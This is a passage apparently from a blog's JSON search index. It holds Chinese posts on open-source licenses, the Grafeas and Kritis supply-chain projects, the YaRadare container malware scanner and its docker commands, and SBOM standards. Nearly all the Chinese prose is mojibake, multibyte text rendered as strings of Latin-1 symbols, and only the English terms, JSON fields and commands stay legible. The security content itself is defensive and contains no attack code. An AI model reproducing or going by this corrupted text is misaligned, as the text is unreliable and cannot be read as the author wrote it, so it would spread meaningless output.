The MIT License\n\nISC\nISCè®¸å¯è¯æ˜¯ä¸€ç§å¼€æ”¾æºä»£ç è®¸å¯è¯ï¼Œåœ¨åŠŸèƒ½ä¸Šä¸ä¸¤å¥ç‰ˆçš„BSDè®¸å¯è¯ç›¸åŒã€‚\nè¿™ä»½è®¸å¯è¯æ˜¯ç”±ISCï¼ˆInternet Systems Consortiumï¼‰æ‰€å‘æ˜ï¼Œåœ¨ISCé‡Šå‡ºè½¯ä»¶æ—¶æ‰€ä½¿ç”¨çš„ã€‚\nå½“å‰ç‰ˆæœ¬Â ISC License (ISC)\n\nBSD\nBSDå¼€æºåè®®ï¼ˆoriginal BSD licenseã€FreeBSD licenseã€Original BSD licenseï¼‰æ˜¯ä¸€ä¸ªç»™äºä½¿ç”¨è€…å¾ˆå¤§è‡ªç”±çš„åè®®ï¼ŒBSD ä»£ç é¼“åŠ±ä»£ç å…±äº«ï¼Œä½†éœ€è¦å°Šé‡ä»£ç ä½œè€…çš„è‘—ä½œæƒã€‚\nBSDç”±äºå…è®¸ä½¿ç”¨è€…ä¿®æ”¹å’Œé‡æ–°å‘å¸ƒä»£ç ï¼Œä¹Ÿå…è®¸ä½¿ç”¨æˆ–åœ¨BSDä»£ç ä¸Šå¼€å‘å•†ä¸šè½¯ä»¶å‘å¸ƒå’Œé”€å”®ï¼Œå› æ­¤æ˜¯å¯¹å•†ä¸šé›†æˆå¾ˆå‹å¥½çš„åè®®ã€‚\nå½“å‰ç‰ˆæœ¬Â The 2-Clause BSD License\n\nGPL\nGPLï¼Œæ˜¯GNU General Public Licenseçš„ç¼©å†™ï¼Œæ˜¯GNUé€šç”¨å…¬å…±æˆæƒéæ­£å¼çš„ä¸­æ–‡ç¿»è¯‘ã€‚å®ƒå¹¶éç”±è‡ªç”±è½¯ä»¶åŸºé‡‘ä¼šæ‰€å‘è¡¨ï¼Œäº¦éä½¿ç”¨GNUé€šç”¨å…¬å…±æˆæƒçš„è½¯ä»¶çš„æ³•å®šå‘å¸ƒæ¡æ¬¾\nåªæœ‰GNUé€šç”¨å…¬å…±æˆæƒè‹±æ–‡åŸæ–‡çš„ç‰ˆæœ¬å§‹å…·æœ‰æ­¤ç­‰æ•ˆåŠ›ã€‚\nå½“å‰ç‰ˆæœ¬Â GNU General Public License\n\nMozilla\nMPLæ˜¯The Mozilla Public Licenseçš„ç®€å†™ï¼Œæ˜¯1998å¹´åˆNetscapeçš„ Mozillaå°ç»„ä¸ºå…¶å¼€æºè½¯ä»¶é¡¹ç›®è®¾è®¡çš„è½¯ä»¶è®¸å¯è¯ã€‚\nMPLè®¸å¯è¯å‡ºç°çš„æœ€é‡è¦åŸå› å°±æ˜¯ï¼ŒNetscapeå…¬å¸è®¤ä¸ºGPLè®¸å¯è¯æ²¡æœ‰å¾ˆå¥½åœ°å¹³è¡¡å¼€å‘è€…å¯¹ æºä»£ç çš„éœ€æ±‚å’Œä»–ä»¬åˆ©ç”¨æºä»£ç è·å¾—çš„åˆ©ç›Šã€‚\nå½“å‰ç‰ˆæœ¬Â Mozilla Public License\n\nLGPL\nLGPLæ˜¯ GNU Lesser General Public License (GNU å®½é€šç”¨å…¬å…±è®¸å¯è¯)çš„ç¼©å†™å½¢å¼ï¼Œæ—§ç§°GNU Library General Public License (GNU åº“é€šç”¨å…¬å…±è®¸å¯è¯),åæ¥æ”¹ç§°ä½œLesser GPLï¼Œå³ä¸ºæ›´å®½æ¾çš„GPLï¼Œåœ¨å®½æ¾ç¨‹åº¦ä¸Šä¸BSD, Apache,XFree86 è®¸å¯è¯ç›¸ä¼¼ã€‚\nå½“å‰ç‰ˆæœ¬Â Lesser General Public License\n\n\n\n\n\n\n\n\n\n\nä¸­å›½æ˜¯å›½é™…ç‰ˆæƒå…¬çº¦æˆå‘˜å›½ï¼Œä¸­å›½æ³•å¾‹è§„å®šäº†åè®®åŠåˆåŒï¼Œå¼€æºåè®®æ˜¯å—åˆåŒæ³•ä¿æŠ¤çš„ã€‚\nè®¸å¯è¯åˆ†ç±»\nCopyleftWhat is copyleft? | Opensource.comCopeleftåˆåˆ†ä¸ºå¼ºï¼ˆstrongï¼‰æˆ–å¼±ï¼ˆweakï¼‰ä¸¤ç§ç±»å‹ã€‚äºŒè€…çš„åŒºåˆ«åœ¨äºæœ‰å¤šå°‘æ–°ä»£ç æˆ–ç›¸é‚»ç å—åˆ°copyleft licenseçš„é™åˆ¶ã€‚\n\næ¥æºå’Œè¡ç”Ÿå“å¿…é¡»åœ¨ç›¸åŒçš„ç‰ˆæƒæ¡æ¬¾ä¸‹ã€‚\nå¦‚æœä½ åˆ†å‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ™å¿…é¡»æä¾›æºä»£ç ä¾‹å­åŒ…æ‹¬ï¼šGPLã€Affero GPLï¼ˆAGPLï¼‰ã€Lesser GPLï¼ˆLGPLï¼‰ã€Mozilla Public Licenseï¼ˆMPLï¼‰ã€Eclipse Public Licenseï¼ˆEPLï¼‰å’ŒCommon Development and Distribution Licenseï¼ˆCDDLï¼‰ã€‚\n\nPermissiveå®½æ¾è®¸å¯åˆ™ç›¸åï¼Œæ›´å¤§ç¨‹åº¦åœ°å‡å°‘è‘—ä½œæƒäººé™åˆ¶ï¼Œç›¸å¯¹å®½æ¾\nweak Copyleftå¼±åŒ–çš„è‘—ä½æƒåˆ™æ˜¯äºŒè€…çš„ä¸­é—´æ€ã€‚\nCopyleft vs permissiveäºŒè€…çš„ä¸»è¦åŒºåˆ«åœ¨äºåˆè§„æ€§è¦æ±‚ä»¥åŠå¦‚ä½•â€œopenâ€ä¿®æ”¹çš„ä»£ç ã€‚é€šå¸¸ï¼Œpermissiveåªè¦æ±‚ä½¿ç”¨è€…åœ¨é‡æ–°å‘å¸ƒä»£ç æ—¶åŒ…å«è®¸å¯è¯æ–‡æœ¬å’ŒåŸå§‹ç‰ˆæƒå£°æ˜çš„å‰¯æœ¬å³å¯ã€‚ä¾‹å¦‚ï¼Œå¼€å‘äººå‘˜å¯ä»¥è·å–ä»£ç ï¼Œä¿®æ”¹ä»£ç ä»¥åˆ›å»ºä¸€ä¸ªæ–°ç¨‹åºï¼Œç„¶åå°†è¯¥ç¨‹åºçš„ä»£ç ä¿ç•™ç»™è‡ªå·±ï¼Œä½¿å…¶æˆä¸ºç§æœ‰çš„æˆ–é—­æºä»£ç ï¼Œå³ä½¿æ˜¯å°†ä¿®æ”¹åçš„è½¯ä»¶è¿›è¡Œå•†ä¸šé”€å”®ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\nè€Œcopyleftåˆ™æœ‰æ›´ä¸¥æ ¼çš„æ¡æ¬¾è§„å®šã€‚ä¸permissive licenseä¸€æ ·ï¼Œå®ƒä»¬é€šå¸¸è¦æ±‚ä½¿ç”¨è€…ç»§æ‰¿åŸç‰ˆæƒå£°æ˜å’Œè®¸å¯æ–‡æœ¬ï¼Œä½†è¿˜è¦æ±‚å¼€å‘è€…åœ¨äºåŸç‰ˆç›¸åŒçš„è®¸å¯ä¸‹ï¼Œå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰€æœ‰æ¥æ”¶è€…åšå‡ºä»»ä½•ä¿®æ”¹æˆ–è¡ç”Ÿä½œå“çš„æºä»£ç è¿›è¡Œå¼€æºã€‚\nå¦‚ä½•é€‰æ‹©å¼€æºè½¯ä»¶çš„åè®®è®¸å¯è¯\nSPDX Licsence List\n\nğŸ“šå‚è€ƒ\nOpen Source Licenses by Category | Open Source Initiative\n[collect]å¦‚ä½•é€‰æ‹©å¼€æºè®¸å¯è¯ï¼Ÿ â€“ ASPIRE\n\n","slug":"æµ…è°ˆæ•æ·å¼€å‘æ¨¡å¼ä¸‹é“¶è¡Œä¸šé‡‘èæœºæ„å¼€æºè½¯ä»¶å¼•å…¥é£é™©åŠç®¡æ§ä¸¾æª","date":"2022-07-12T09:46:07.062Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"å¼€æºè½¯ä»¶æ²»ç†,å¼€æºè½¯ä»¶å¼•å…¥","author_index":"Moses"},{"id":"82f3f8f0afc02942b9512346798bab47","title":"æ–°æŠ€æœ¯è°ƒç ”å¯ä¿¡äº‘åŸç”Ÿè½¯ä»¶ä¾›åº”é“¾-Grafeaså’ŒKritis","content":"å¯ä¿¡äº‘åŸç”Ÿè½¯ä»¶ä¾›åº”é“¾-Grafeaså’Œkritisé¡¹ç›®è°ƒç ”0x01èƒŒæ™¯åœ¨Googleå†…éƒ¨è¿è¡Œäº†å¤§é‡çš„å®¹å™¨ï¼Œæ¯å‘¨éœ€è¦éƒ¨ç½²è¶…è¿‡20äº¿æ¬¡å®¹å™¨(2019å¹´5æœˆæ•°æ®ï¼ŒÂ Software Supply Chain with Grafeas and KritisÂ ï¼Œæˆ‘ç†è§£æ˜¯æ¯å¤©éœ€è¦åˆ›å»º3äº¿æ¬¡å®¹å™¨) ï¼Œæ‰€ä»¥Googleæœ‰å·¨å¤§çš„å‹åŠ›éœ€è¦äº†è§£å®¹å™¨å†…ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Œéƒ¨ç½²äº†ä»€ä¹ˆä»£ç ï¼Œå“ªäº›ä»£ç æ˜¯è‡ªå·±å¼€å‘çš„ã€‚\n\n\n\n\n\n\n\n\n\nä»»ä½•ä¸€ä¸ªå·¨å‹è½¯ä»¶å…¬å¸éƒ½ä½¿ç”¨äº†å¤§é‡çš„å¼€æºã€å•†ç”¨ä»¥åŠè‡ªç ”è½¯ä»¶ï¼Œå°±å¥½æ¯”ç»„è£…iPhoneæ˜¯ç”±å…¨ä¸–ç•Œä¸åŒä¾›åº”å•†æä¾›çš„é›¶éƒ¨ä»¶ï¼Œä½ éœ€è¦å®Œæ•´è·Ÿè¸ªæ•´ä¸ªä¾›åº”é“¾ï¼Œä»¥ç¡®ä¿è´¨é‡å’Œå®‰å…¨æ€§ã€‚**ç”±äºè½¯ä»¶å¼€å‘ä¸­å¤šè¯­è¨€çš„æ•°æ®è§„èŒƒå­˜åœ¨è¾ƒå¤§çš„å·®å¼‚ï¼ŒGroovyæœ‰è‡ªå·±å®šä¹‰çš„å‘½åè§„èŒƒã€Dockerä½¿ç”¨Sha256æ¥è¡¨ç¤ºæ¯ä¸€å±‚layerã€Goè¯­è¨€ä½¿ç”¨URLå®šä¹‰è‡ªå·±çš„ç»„ä»¶åœ°å€ä½ å¯ä»¥å°†Grafeas+Kritisè§†ä¸ºä¸€ä¸ªå·¨å¤§çš„è½¯ä»¶æŒ‡çº¹åº“ï¼Œæ¥éªŒè¯éƒ¨ç½²çš„æºä»£ç ã€è½¯ä»¶çŠ¶æ€ã€æµ‹è¯•å’Œå®‰å…¨è®°å½•ã€‚åœ¨InfoQæœ‰ä¸€ç¯‡ç¿»è¯‘ä»‹ç»æ–‡ç« Â ä½¿ç”¨â€œGrafeasâ€å…ƒæ•°æ® API å’Œâ€œKritisâ€éƒ¨ç½²æˆæƒç®¡ç†è½¯ä»¶ä¾›åº”é“¾\nå½“ä½ ç¼–å†™äº†ä»£ç ï¼Œæ„å»ºäº†é•œåƒä»¥åŠå®¹å™¨ï¼Œå¹¶ä¸”æµ‹è¯•å’ŒéªŒè¯äº†äºŒè¿›åˆ¶ä»£ç ï¼Œç„¶åé€šè¿‡QAæµ‹è¯•æœ€ç»ˆéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€‚è¿™ä¸ªè¿‡ç¨‹ç”±æŒç»­é›†æˆCI pipelinesè‡ªåŠ¨å®Œæˆã€‚ä½ ä¾ç„¶éœ€è¦æ£€æŸ¥ä½ çš„å‘å¸ƒåŒ…ä¸­æ‰€åŒ…å«çš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œå› ä¸ºä½ åªæ§åˆ¶äº†è‡ªå·±ç¼–å†™çš„ç¨‹åºä»£ç éƒ¨åˆ†ï¼Œå¦‚æœæ²¡æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–çš„åŠŸèƒ½ã€å®‰å…¨æ£€æŸ¥ï¼Œä½ ä¾ç„¶æ— æ³•ä¿¡ä»»è‡ªå·±å‘å¸ƒçš„è½¯ä»¶åŒ…æ˜¯å®‰å…¨å¯é çš„ã€‚\nGoogleå¼€å‘äº†Grafeaså’ŒKritisï¼Œé€šè¿‡å¼€æ”¾çš„metadata(å…ƒæ•°æ®)æ ‡å‡†ï¼Œå®šä¹‰å¦‚ä½•æ„å»ºå…ƒæ•°æ®å’Œæµ‹è¯•å…ƒæ•°æ®ï¼Œå¹¶ä¸”ä½œä¸ºä¸€ä¸ªä¸­å¿ƒåŒ–çš„å…ƒæ•°æ®çŸ¥è¯†åº“ï¼ŒåŒ…å«äº†ä½ çš„æœ€ç»ˆäº§å“æ‰€ä½¿ç”¨çš„å˜é‡ä»¥åŠç¼–è¯‘ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡é…ç½®ç­–ç•¥æ§åˆ¶å’ŒæŸ¥çœ‹ä¿®æ”¹ï¼Œç„¶åé€šè¿‡Kritis(ç®¡ç†æ§åˆ¶å™¨)éƒ¨ç½²åˆ°Kubernetesä¸­ï¼Œå°±å¯ä»¥è¿è¡Œé›†ç¾¤ç®¡ç†å®šä¹‰ï¼Œåœ¨æŸäº›podåŠ è½½æ˜¯æ£€æŸ¥é•œåƒä¸­çš„æœåŠ¡æ¼æ´ä»¥åŠé•œåƒæ¥æºï¼Œå¦‚æœä¸ç¬¦åˆç®¡ç†å®šä¹‰ç­–ç•¥ï¼Œå°±ä¼šæ‹’ç»åŠ è½½podã€‚\n\n\n\n\n\n\n\n\n\nGrafeasæ˜¯ä¸­å¿ƒåŒ–å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒï¼›Kritisæ˜¯è¿è¡Œåœ¨Kubernetesé›†ç¾¤ä¸­çš„ç®¡ç†æ§åˆ¶å™¨ã€‚Kritisæ˜¯é€šè¿‡Grafeasæä¾›çš„APIæ¥è¯»å–å…ƒæ•°æ®ä¿¡æ¯ï¼Œç„¶åå¯¹å®¹å™¨è¿›è¡Œç­–ç•¥æ£€æŸ¥\n\n0x02Grafraså…ƒæ•°æ®å®‰å…¨å®¡è®¡GitHub - grafeas&#x2F;grafeas: Artifact Metadata APIGrafeas èµ·æºäºå®¹å™¨çš„å®‰å…¨æ€§è´¨é‡æ§åˆ¶ï¼Œä½†ä»å®šä¹‰æ¥çœ‹å®ƒå¹¶ä¸å±€é™äºå®¹å™¨ã€‚å®ƒæ˜¯æä¾›ç»Ÿä¸€æ–¹å¼æ¥å®¡è®¡ï¼Œç›‘æ§è½¯ä»¶ç»„ä»¶çš„å¼€æºå·¥ä»¶å…ƒæ•°æ® APIã€‚ è¿™é‡Œçš„â€™Softwareâ€™å¯ä»¥æ˜¯ Docker é•œåƒï¼Œä¹Ÿå¯ä»¥æ˜¯ Warï¼ŒJar å’Œ Zip åŒ…ï¼Œâ€™Supply Chainâ€™ æŒ‡çš„æ˜¯æ„å»ºè¿™äº›å‘å¸ƒåŒ…æ‰€åŒ…å«çš„ç»„ä»¶ã€‚Grafeasæ˜¯ç”±IBMä¸è°·æ­Œåˆä½œæ¨å‡ºçš„ã€‚Grafeasæä¾›äº†ä¸¤ç§å…ƒæ•°æ®çš„apiï¼Œnoteså’Œoccurrencesï¼šProjectsï¼šæ˜¯noteså’Œoccurrencesçš„å­˜å‚¨åº“ã€‚  \n\nNotesï¼šæ˜¯æœ‰å…³è½¯ä»¶æ„ä»¶çš„æŸäº›æ–¹é¢çš„ç»†èŠ‚ã€‚è¿™å¯ä»¥æ˜¯å¯¹å·²çŸ¥è½¯ä»¶æ¼æ´çš„æè¿°ï¼Œå…³äºå¦‚ä½•æ„å»ºè½¯ä»¶çš„ç»†èŠ‚(æ„å»ºç‰ˆæœ¬ï¼Œå®ƒçš„æ ¡éªŒå’Œç­‰ç­‰)ï¼Œä»¥åŠå®ƒéƒ¨ç½²çš„å†å²ç­‰ç­‰ã€‚  \nOccurrencesï¼šæ˜¯notesçš„å®ä¾‹ï¼Œå…¶ä¸­è¯¦ç»†æè¿°äº†å®ƒä»¬æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼Œä»¥åŠå®ƒä»¬æ˜¯å¦‚ä½•åˆ›å»ºçš„ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå·²çŸ¥çš„è½¯ä»¶æ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½ä¼šå‡ºç°æè¿°å“ªä¸ªæ¼æ´æ‰«æå™¨åœ¨æ£€æµ‹åˆ°å®ƒæ—¶æ£€æµ‹åˆ°çš„ä¿¡æ¯ï¼Œä»¥åŠè¯¥æ¼æ´æ˜¯å¦è¢«å¤„ç†è¿‡ã€‚\n\nNotesnotesæè¿°äº†å…ƒæ•°æ®çš„ä¸Šå±‚æè¿°ã€‚ä¸¾ä¾‹ï¼Œä½ å¯ä»¥åœ¨åˆ†æäº†ä¸€ä¸ªLinuxè½¯ä»¶åŒ…ä¹‹ååˆ›å»ºä¸€ä¸ªæœ‰å…³ç‰¹å®šå®‰å…¨æ¼æ´çš„noteã€‚ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªnoteæ¥å­˜å‚¨æœ‰å…³ä¸€ä¸ªç¼–è¯‘è¿›ç¨‹çš„ç¼–è¯‘å™¨ä¿¡æ¯ã€‚noteé€šå¸¸ç”±æ‰§è¡Œè¿™ä¸ªåˆ†æçš„provideræ¥æ‹¥æœ‰å’Œåˆ›å»ºã€‚å¯ä»¥é€šè¿‡åˆ†æä»¥åŠè·¨ä¸åŒé¡¹ç›®å‘ç”Ÿå¤šæ¬¡æ¥ç”Ÿæˆnotesã€‚\nnoteçš„åå­—å¿…é¡»æŒ‰ç…§æ ¼å¼Â /projects/&lt;project_id&gt;/notes/&lt;notes_id&gt;Â ã€‚è¿™é‡Œnote IDæ˜¯å¯¹æ¯ä¸ªé¡¹ç›®å”¯ä¸€ï¼Œå¹¶ä¸”å°½å¯èƒ½æä¾›ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œæ¼æ´noteå¯¹åå­—å¯ä»¥æ˜¯Â CVE-2013-4869Â ä»¥å¼•ç”¨å®ƒæ‰€æè¿°å¯¹CVEã€‚\né€šå¸¸åº”è¯¥å°†noteå’Œoccurrenceså­˜å‚¨åˆ°å„è‡ªç‹¬ç«‹å¯¹é¡¹ç›®ï¼Œè¿™æ ·å¯ä»¥ä½¿ç”¨ç²¾ç»†æ§åˆ¶çš„è®¿é—®æƒé™æ¥ç®¡ç†ã€‚noteåªèƒ½ç”±noteçš„ownerç¼–è¾‘ï¼Œå¹¶ä¸”åªå¯¹å…·æœ‰è®¿é—®å¼•ç”¨occurrencesçš„ç”¨æˆ·åªè¯»ã€‚\nOccurrences(å­˜åœ¨)occurrenceæ˜¯noteçš„æ‰§è¡Œå®ä½“(å®ä¾‹&#x2F;instantiation)ã€‚occurrencesæè¿°äº†ç»™å®šnoteçš„ç‰¹å®šå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæœ‰å…³ä¸€ä¸ªæ¼æ´çš„noteçš„occurrenceå°†ä¼šæè¿°åœ¨å“ªä¸ªè½¯ä»¶åŒ…ä¸­å‘ç°æ¼æ´ï¼ŒæŒ‡å®šè¡¥æ•‘æ­¥éª¤(remediation steps)ã€‚æˆ–è€…ï¼Œä¸€ä¸ªæœ‰å…³ç¼–è¯‘è¯¦æƒ…çš„noteçš„occurrenceä¼šæè¿°ä¸€ä¸ªç¼–è¯‘çš„ç”Ÿæˆçš„å®¹å™¨é•œåƒã€‚\n0x03 KritisKritisæ˜¯ä¸€ä¸ªæ‹Ÿè®®çš„è½¯ä»¶ä¾›åº”é“¾ç®¡ç†æ¡†æ¶ï¼Œå®ƒå…è®¸ä½¿ç”¨å­˜å‚¨äºGrafeasä¸­çš„å…ƒæ•°æ®ä¸Kubernetesæ„å»ºå’Œå®æ–½å®æ—¶éƒ¨ç½²ç­–ç•¥ï¼Œè¿™å¯ä»¥é¿å…å‘å¸ƒå­˜åœ¨å·²çŸ¥é—®é¢˜çš„å®¹å™¨é•œåƒã€‚kritis-validation-hookç»„ä»¶æ˜¯éƒ¨ç½²å¯ä¿¡å®¹å™¨ç¯èŠ‚ä¸­è¿›è¡Œå®¹å™¨é•œåƒç­¾åéªŒè¯çš„å…³é”®ç»„ä»¶ã€‚é€šè¿‡åœ¨éƒ¨ç½²å‰å¯¹å®¹å™¨é•œåƒè¿›è¡Œç­¾åéªŒè¯å¯ä»¥ç¡®ä¿åªéƒ¨ç½²ç»è¿‡å¯ä¿¡æˆæƒæ–¹è¿›è¡Œè¿‡ç­¾åçš„å®¹å™¨é•œåƒï¼Œé™ä½åœ¨ç¯å¢ƒä¸­è¿è¡Œæ„å¤–æˆ–æ¶æ„ä»£ç çš„é£é™©ã€‚\nKritisçš„ä½¿ç”¨æ˜¯éªŒè¯å‹admission webhookï¼Œè¿™æ˜¯åœ¨æ¥æ”¶åˆ°admissionè¯·æ±‚ä»¥åçš„HTTPå›è°ƒï¼Œå°±èƒ½å¤Ÿæ ¹æ®å®šåˆ¶çš„admissionç­–ç•¥æ¥å†³å®šæˆ‘ä»¬æ˜¯å¦æ¥å—æˆ–è€…æ‹’ç»è¿™ä¸ªè¯·æ±‚ã€‚GitHub - grafeas&#x2F;kritis: Deploy-time Policy Enforcer for Kubernetes applications\n0x04æ¶æ„å›¾\n0x05æ€»ç»“æ€»çš„æ¥è¯´Grafeasè¿™ä¸ªé¡¹ç›®è¿˜æœ‰ä¸å°‘å·¥ä½œè¦åšï¼Œä½†æ˜¯å¯¹äºæœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œè½¯ä»¶ä¾›åº”é“¾å»ºæ¨¡ä»¥åŠç›¸å¯¹åº”çš„APIï¼Œé¡¹ç›®è®¾è®¡å¾—æ¯”è¾ƒå¦¥å½“ï¼Œæ‹…å¾—ä¸Šã€ŒA Component Metadata APIã€è¿™ä¸ªç§°å·ã€‚è¿™ä¸ªæ„Ÿè§‰ç±»ä¼¼äºGoogleåœ¨CI&#x2F;CDäº‘åŸç”Ÿé¢†åŸŸçš„Tektoné¡¹ç›®ï¼ŒåŒæ ·æ˜¯é å‡ºè‰²çš„å»ºæ¨¡è„±é¢–è€Œå‡ºã€‚è€Œä¸”æœ‰æ„æ€çš„æ˜¯è¿™ä¸¤ä¸ªé¡¹ç›®éƒ½å‡ºè‡ªGoogleï¼Œè€Œä¸æ˜¯å‚ç›´è¡Œä¸šé‡Œçš„è€å¤§JFrog&#x2F;Jenkinsï¼Œåè€Œæ˜¯ç­‰Googleæ¨å‡ºåï¼ŒJFrog&#x2F;Jenkinsä¸çº¦è€ŒåŒåœ°åŠ å…¥äº†Googleçš„Grafeas&#x2F;Tektoné¡¹ç›®ã€‚\nReferencesKubernetes æ—¶ä»£çš„å®‰å…¨è½¯ä»¶ä¾›åº”é“¾-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº\n","slug":"å¯ä¿¡äº‘åŸç”Ÿè½¯ä»¶ä¾›åº”é“¾-Grafeaså’Œkritisé¡¹ç›®è°ƒç ”","date":"2022-07-12T03:19:54.198Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,äº‘åŸç”Ÿå®‰å…¨,æ–°æŠ€æœ¯è°ƒç ”","author_index":"Moses"},{"id":"de32a1a96e94010ffce347f9070bfa2b","title":"äº‘åŸç”Ÿæ¶æ„è½¯ä»¶æ‰«æ","content":"äº‘åŸç”Ÿæ¶æ„è½¯ä»¶æ‰«æ0x01ç®€ä»‹YaRadareå¯ä»¥å¯¹å®¹å™¨é•œåƒã€æ­£åœ¨è¿è¡Œçš„dockerå®¹å™¨å’Œç³»ç»Ÿæ–‡ä»¶ä¸­æ‰¾åˆ°æ¶æ„è½¯ç”²å¨èƒçš„äº‹ä»¶ã€‚ä½¿ç”¨Â YARA rulesetè¯†åˆ«èµ„æºåŒ¹é…æ¶æ„è½¯ä»¶ç­¾åã€‚\n0x02æ¶æ„å›¾ç•¥\n0x03æ ¸å¿ƒèƒ½åŠ›\nAt rest: scan local container images, for example, before they are deployed, to verify they do not contain malware\nAt runtime: scan running docker containers, for example, if you observe unusual network traffic or CPU activity\nAgainst filesystems: at any time, YaRadare can scan a local filesystems for indicators of compromise\n\nKey capabilities:\n\nScan running and at-rest containers, and filesystems\nRun anywhere: highly-portable, docker container form factor or universal GO binaryÂ work in progress\nDesigned for automation: easy-to-deploy, easy-to-parse JSON output\n\n0x04å¯¹æ¯”ç•¥\n0x05Quickstartbuild yaRadredocker build --rm&#x3D;true --tag&#x3D;deepfenceio&#x2F;deepfence-yaradare:latest -f Dockerfile .\n\næ‰«æå®¹å™¨é•œåƒ\ndocker pull node:latest\n\ndocker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock \\\n    deepfenceio&#x2F;deepfence-yaradare:latest --image-name node:latest\n\ndocker rmi node:latest\n\næ‰«æè¿è¡Œçš„å®¹å™¨docker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock \\\n    -v &#x2F;:&#x2F;deepfence&#x2F;mnt \\\n    deepfenceio&#x2F;deepfence-yaradare:latest \\\n    --host-mount-path &#x2F;deepfence&#x2F;mnt --container-id 69221b948a73\n\næ‰«æç³»ç»Ÿæ–‡ä»¶docker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v ~&#x2F;src&#x2F;YARA-RULES:&#x2F;tmp&#x2F;YARA-RULES \\\n    deepfenceio&#x2F;deepfence-yaradare:latest \\\n    --local &#x2F;tmp&#x2F;YARA-RULES --host-mount-path &#x2F;tmp&#x2F;YARA-RULES\n\n","slug":"äº‘åŸç”Ÿæ¶æ„è½¯ä»¶æ‰«æ","date":"2022-07-08T03:50:32.192Z","categories_index":"Cloud-Native-Security","tags_index":"æ¶æ„æ–‡ä»¶è½¯ä»¶æ‰«æ,DevSecOps,yara-scanner,threat-hunting,ioc","author_index":"Moses"},{"id":"ff9f99b916729c965fcce33c1ab740e6","title":"æ¦‚å¿µæ¢³ç†-è½¯ä»¶ä¾›åº”é“¾æ¸…å•SBOM","content":"æ¦‚è¿°å’ŒèƒŒæ™¯è½¯ä»¶ä¾›åº”é“¾å®‰å…¨å§‹äºå¯¹å…³é”®ç¯èŠ‚çš„å¯è§æ€§ï¼Œä¼ä¸šéœ€è¦ä¸ºæ¯ä¸ªåº”ç”¨ç¨‹åºæŒç»­æ„å»ºè¯¦ç»†çš„ SBOMï¼ˆSoftware Bill of Materialï¼Œè½¯ä»¶ç‰©æ–™æ¸…å•ï¼‰ï¼Œä»è€Œå…¨é¢æ´å¯Ÿæ¯ä¸ªåº”ç”¨è½¯ä»¶çš„ç»„ä»¶æƒ…å†µã€‚SBOM æ˜¯æè¿°è½¯ä»¶åŒ…ä¾èµ–æ ‘çš„ä¸€ç³»åˆ—å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬ä¾›åº”å•†ã€ç‰ˆæœ¬å·å’Œç»„ä»¶åç§°ç­‰å¤šé¡¹å…³é”®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åœ¨åˆ†æè½¯ä»¶å®‰å…¨æ¼æ´æ—¶å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚\nä¸Šè¡¨æ˜¯ä¸€ä»½è½¯ä»¶ç‰©æ–™æ¸…å•ç¤ºä¾‹ï¼Œå…¶ä¸­ SPDX å’Œ SWID æ˜¯ä¸¤ç§å›½é™…é€šç”¨çš„ SBOM å­—æ®µæ ‡å‡†ã€‚\n\nSPDXï¼ˆThe Software Package Data Exchangeï¼Œè½¯ä»¶åŒ…æ•°æ®äº¤æ¢ï¼‰æ˜¯ Linux åŸºé‡‘ä¼šä¸‹çš„å¼€æ”¾æ€§æ ‡å‡†ï¼Œå…¶ç”¨äºäº¤æµè½¯ä»¶ç‰©æ–™æ¸…å•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç»„ä»¶ã€è®¸å¯è¯ã€ç‰ˆæƒç­‰ä¿¡.SPDX é€šè¿‡ä¸ºå…¬å¸å’Œç¤¾åŒºå…±äº«é‡è¦æ•°æ®æä¾›é€šç”¨æ ¼å¼æ¥å‡å°‘å†—ä½™å·¥ä½œï¼Œä»è€Œç®€åŒ– æµç¨‹å¹¶æé«˜åˆè§„æ€§ã€‚\nSWIDï¼ˆSoftware Identificationï¼Œè½¯ä»¶æ ‡è¯†ï¼‰æ ‡ç­¾æ—¨åœ¨ä¸ºç»„ç»‡æä¾›ä¸€ç§é€æ˜çš„æ–¹å¼æ¥è·Ÿè¸ªåœ¨ä»–ä»¬çš„æ‰˜ç®¡è®¾å¤‡å•†å®‰è£…çš„è½¯ä»¶ï¼Œå®ƒäº 2012 å¹´ç”± ISO æå‡ºï¼Œå¹¶äº 2015 å¹´æ›´æ–°ä¸º ISO&#x2F;IEC 19770-2:2015ã€‚SWID æ ‡ç­¾æ–‡ä»¶åŒ…å«æœ‰å…³è½¯ä»¶äº§å“ç‰¹å®šç‰ˆæœ¬è¯¦å°½çš„æè¿°æ€§ä¿¡æ¯ã€‚é™¤è¡¨æ ¼ä¸­çš„ä¸¤ç§åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ SBOM å­—æ®µæ ‡å‡†å¤–ï¼Œè¿˜æœ‰ CycloneDXã€CoSWIDã€CPEã€Grafeas 